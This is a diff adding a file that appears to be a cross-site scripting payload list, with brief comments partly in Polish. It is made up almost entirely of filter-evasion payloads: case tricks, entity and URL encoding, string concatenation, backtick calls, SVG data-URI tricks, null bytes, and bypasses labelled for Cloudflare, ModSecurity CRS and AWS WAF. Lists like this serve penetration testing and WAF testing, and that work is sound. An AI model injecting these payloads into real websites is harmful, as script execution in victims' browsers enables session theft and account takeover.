@@ -1,0 +1,70 @@
+# === Case variation ===
+# Bypass case-sensitive blacklist
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x ONERROR=alert(1)>
+
+# === Bez spacji (slash zamiast space) ===
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+<svg\x09onload=alert(1)>
+<svg\x0Conload=alert(1)>
+
+# === HTML entity encoding ===
+# &#x3C; / &#60; — bypass naive < block
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&lt;script&gt;alert(1)&lt;/script&gt;
+# Bez średnika (akceptowane przez wiele parserów)
+&#x3Cscript&#x3Ealert(1)&#x3C/script&#x3E
+
+# === URL encoding (single + double) ===
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+
+# === Unicode escapes (in JS context) ===
+<script>alert(1)</script>
+alert(1)
+
+# === String split/concat (bypass keyword block) ===
+<svg onload=window['ale'+'rt'](1)>
+<svg onload=window['\x61lert'](1)>
+<img src=x onerror=top["al"+"ert"](1)>
+
+# === Backtick / template literal call ===
+# Bypass filtrów wymagających ( po alert
+<svg onload=alert`1`>
+<img src=x onerror=alert`1`>
+
+# === Throw / location bypass ===
+<svg onload=throw onerror=alert,1>
+<svg onload=location='javascript:alert(1)'>
+
+# === SVG with namespace tricks ===
+<svg><script xlink:href=data:,alert(1) />
+<svg><use href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIGlkPSd4Jz48aW1hZ2UgaHJlZj0nMScgb25lcnJvcj0nYWxlcnQoMSknIC8+PC9zdmc+#x"/>
+
+# === Null byte / control char (legacy stacks) ===
+<scri%00pt>alert(1)</scri%00pt>
+<img src=x onerror=\x00alert(1)>
+
+# === Cloudflare WAF bypass (historical) ===
+<svg/onload=&#97&#108&#101&#114&#116(1)>
+<a href="javascript:%0aalert(1)">x</a>
+
+# === ModSecurity CRS bypass ===
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=eval(/aler/.source+/t(1)/.source)>
+
+# === AWS WAF bypass (historical) ===
+<svg/onload=alert?.(1)>
+<svg onload="(()=>alert(1))()">
+
+# === Encoded event handler ===
+<a onmouseover&#x3D;alert(1)>x
+<svg onload&#x3D;alert(1)>
+
+# === Comment injection (HTML) ===
+<!--><svg onload=alert(1)>
+<! --><svg onload=alert(1)>
+
+# === Polyglot tag confusion (parser desync) ===
+<a"<b><script>alert(1)</script>
